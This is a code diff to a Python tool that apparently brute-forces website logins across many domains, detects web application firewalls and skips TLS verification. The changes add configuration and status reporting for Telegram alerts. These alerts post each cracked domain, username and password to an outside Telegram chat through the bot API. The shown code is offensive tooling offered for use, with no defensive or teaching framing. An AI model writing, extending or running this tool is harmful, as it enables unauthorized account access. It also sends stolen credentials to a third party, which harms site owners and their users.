@@ -15,10 +15,15 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # ---------------------------
 # Config
 # ---------------------------
-TELEGRAM_TOKEN = "TELEGRAM_TOKEN"
-TELEGRAM_CHAT_ID = "TELEGRAM_CHAT_ID"
-TELEGRAM_TOPIC_SUCCESS = None
-TELEGRAM_TOPIC_ERROR = None
+# Set to False to completely disable Telegram sending and related messages.
+TELEGRAM_SEND = True
+
+# Replace with your actual Telegram bot token and chat ID if TELEGRAM_SEND is True.
+TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"          # e.g. "123456:ABC-DEF..."
+TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"          # e.g. "-1001234564890"
+TELEGRAM_TOPIC_SUCCESS = None              # optional e.g. 1265
+TELEGRAM_TOPIC_ERROR = None                # optional e.g. 4568
+
 ERROR_CREDS = []
 ERROR_LOCK = threading.Lock()
 
@@ -46,17 +51,57 @@ def get_session():
     return create_session()
 
 # ---------------------------
-# Helpers
+# Telegram helpers
 # ---------------------------
-def send_telegram(text: str, topic_id: int = None):
+def telegram_configured():
+    """Return True if Telegram token and chat ID are set to non-placeholder values."""
+    if not TELEGRAM_SEND:
+        return False
+    token = TELEGRAM_TOKEN.strip()
+    chat_id = TELEGRAM_CHAT_ID.strip()
+    return bool(token) and bool(chat_id) and token != "YOUR_BOT_TOKEN" and chat_id != "YOUR_CHAT_ID"
+
+def send_telegram(text: str, topic_id: int = None) -> str:
+    """
+    Send a message via Telegram. Returns a status string:
+      - "disabled" if TELEGRAM_SEND is False
+      - "not_configured" if token/chat_id are missing/placeholder
+      - "sent" on success
+      - "error: <message>" on failure
+    """
+    if not TELEGRAM_SEND:
+        return "disabled"
+    if not telegram_configured():
+        return "not_configured"
+
     try:
-        data = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
+        data = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": text,
+            "parse_mode": "HTML"
+        }
         if topic_id:
             data["message_thread_id"] = topic_id
-        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data=data, timeout=3)
-    except:
-        pass
 
+        resp = requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+            data=data,
+            timeout=5
+        )
+        if resp.status_code == 200:
+            return "sent"
+        else:
+            try:
+                err = resp.json().get("description", "Unknown error")
+            except:
+                err = resp.text or "Unknown error"
+            return f"error: {err}"
+    except Exception as e:
+        return f"error: {e}"
+
+# ---------------------------
+# WAF detection
+# ---------------------------
 def detect_waf(url: str, session: requests.Session) -> str:
     try:
         r = session.get(url, timeout=6, verify=False)
@@ -307,17 +352,28 @@ def run_brute_on_domain(domain: str, users, passes, args, retry_mode=False, sile
             for future in done:
                 if future.result():
                     success_found = True
-                    # Always send success message, even in continue mode
+                    # Retrieve success details
                     with state['lock']:
                         details = state['success_details']
                     if details:
                         d, u, p, s = details
                         msg = f"🔥🎉 SUCCESS FOUND 🎉🔥\n\n🌐 Domain: {d}\n👤 Username: {u}\n🔑 Password: {p}\n📊 Status: {s}"
-                        if not continue_flag:
-                            print()  # newline before success message
-                            print(msg)
+                        # Print newline before success message to separate from progress line
+                        print()
+                        print(msg)
                         save_success(d, u, p, s)
-                        send_telegram(msg, TELEGRAM_TOPIC_SUCCESS)
+
+                        # Send Telegram notification if enabled
+                        if TELEGRAM_SEND:
+                            telegram_status = send_telegram(msg, TELEGRAM_TOPIC_SUCCESS)
+                            if telegram_status == "sent":
+                                print("[Telegram] ✅ Sent successfully.")
+                            elif telegram_status == "not_configured":
+                                print("[Telegram] ⚠️ Not configured (token/chat_id missing).")
+                            elif telegram_status == "disabled":
+                                pass  # should not happen if TELEGRAM_SEND is True
+                            else:
+                                print(f"[Telegram] ❌ {telegram_status}")
                     
                     if not continue_flag:
                         # Cancel all running tasks
@@ -406,6 +462,10 @@ def main():
 
     if not args.silent:
         banner()
+
+    # Check Telegram configuration and print a note (only if TELEGRAM_SEND is True)
+    if TELEGRAM_SEND and not telegram_configured():
+        print("[Telegram] ⚠️ Not configured. Success notifications will not be sent.")
 
     # Clear ERRORS.txt at start to avoid stale entries from previous runs
     if Path("ERRORS.txt").exists():
